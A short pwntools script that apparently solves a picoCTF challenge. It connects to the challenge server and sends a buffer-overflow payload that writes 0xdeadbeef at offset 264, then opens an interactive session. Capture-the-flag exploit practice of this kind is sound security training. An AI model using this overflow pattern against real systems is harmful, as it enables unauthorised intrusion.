from pwn import * 
exe = context.binary = ELF('chall')
io = remote('mars.picoctf.net', 31890)

io.recvuntil('see')
offset = 264
payload = fit ({
    offset: 0xdeadbeef
})

io.sendline(payload)
io.interactive()
